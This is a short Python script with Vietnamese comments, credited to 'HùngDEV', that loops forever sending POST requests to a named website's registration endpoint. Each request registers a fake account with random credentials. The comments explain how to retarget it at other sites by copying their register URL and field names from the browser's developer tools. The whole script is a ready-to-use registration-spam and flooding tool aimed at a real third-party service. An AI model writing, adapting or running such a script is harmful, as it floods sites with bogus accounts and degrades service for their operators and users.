import requests
import random
import string

print("Tool By HùngDEV. Ctrl+Z để thoát. Bật f12 lên mà bắt request!")


def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def create_user_credentials():
    username = generate_random_string(
        10)  #+ "spammedbyhungdev"  #bỏ dấu # để thêm hậu tố spammed byhungdev
    #bạn cũng có thể tự thay đổi username theo ý muốn
    password = generate_random_string(15)
    email = f"{username}@gmail.com"
    return username, password, email


def send_post_request():
    url = 'https://chungapi.net/ajaxs/client/register.php'  #thay url xử lí tạo user ở đây
    username, password, email = create_user_credentials()

    data = {
        #'type': "register",  #thay loại info gửi đi ở đây
        'username': username,  #có thể là taikhoan hoặc username
        'password': password,  #có thể là password hoặc matkhau
        'repassword': password,  #web ko yêu cầu thì bỏ
        'email': email
    }
    #username=demoooo&email=demoooo%40demoooo.demoooo&password=demoooo&repassword=demoooo
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(
                f"Yêu cầu tạo tài khoản thành công! Tên người dùng: {username}, Mật khẩu: {password}, Email: {email}"
            )
        else:
            print(f"Yêu cầu thất bại. Mã trạng thái: {response.status_code}")
    except requests.RequestException as e:
        print(f"Lỗi khi gửi yêu cầu POST: {e}")


send_post_request()
while True:
    send_post_request()
